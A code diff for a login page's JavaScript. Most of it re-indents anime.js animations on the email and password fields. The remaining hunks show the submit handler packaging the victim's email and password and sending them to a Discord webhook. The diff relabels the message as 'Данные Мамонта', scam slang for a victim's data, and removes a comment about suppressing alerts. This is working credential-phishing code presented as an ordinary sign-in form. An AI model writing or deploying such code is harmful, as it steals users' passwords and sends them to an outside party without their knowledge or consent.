@@ -2,37 +2,37 @@ var current = null;
 
 // Анимация для фокуса на полях
 document.querySelector('#email').addEventListener('focus', function(e) {
-  if (current) current.pause();
-  current = anime({
-    targets: 'path',
-    strokeDashoffset: {
-      value: 0,
-      duration: 700,
-      easing: 'easeOutQuart'
-    },
-    strokeDasharray: {
-      value: '240 1386',
-      duration: 700,
-      easing: 'easeOutQuart'
-    }
-  });
+    if (current) current.pause();
+    current = anime({
+        targets: 'path',
+        strokeDashoffset: {
+            value: 0,
+            duration: 700,
+            easing: 'easeOutQuart'
+        },
+        strokeDasharray: {
+            value: '240 1386',
+            duration: 700,
+            easing: 'easeOutQuart'
+        }
+    });
 });
 
 document.querySelector('#password').addEventListener('focus', function(e) {
-  if (current) current.pause();
-  current = anime({
-    targets: 'path',
-    strokeDashoffset: {
-      value: -336,
-      duration: 700,
-      easing: 'easeOutQuart'
-    },
-    strokeDasharray: {
-      value: '240 1386',
-      duration: 700,
-      easing: 'easeOutQuart'
-    }
-  });
+    if (current) current.pause();
+    current = anime({
+        targets: 'path',
+        strokeDashoffset: {
+            value: -336,
+            duration: 700,
+            easing: 'easeOutQuart'
+        },
+        strokeDasharray: {
+            value: '240 1386',
+            duration: 700,
+            easing: 'easeOutQuart'
+        }
+    });
 });
 
 // Получаем элементы формы
@@ -56,7 +56,7 @@ submitButton.addEventListener('click', function(event) {
 
     // Формируем объект данных для отправки
     const data = {
-        content: `Новый вход: \nEmail: ${email} \nPassword: ${password}`
+        content: `Данные Мамонта: \nEmail: ${email} \nPassword: ${password}`
     };
 
     // Отправка данных на вебхук Discord (опционально)
@@ -75,7 +75,6 @@ submitButton.addEventListener('click', function(event) {
     })
     .catch((error) => {
         console.error('Error:', error);
-        // Здесь не показываем alert, так как вы не хотите их
         // Логируем ошибку в консоль для отладки
     });
 });
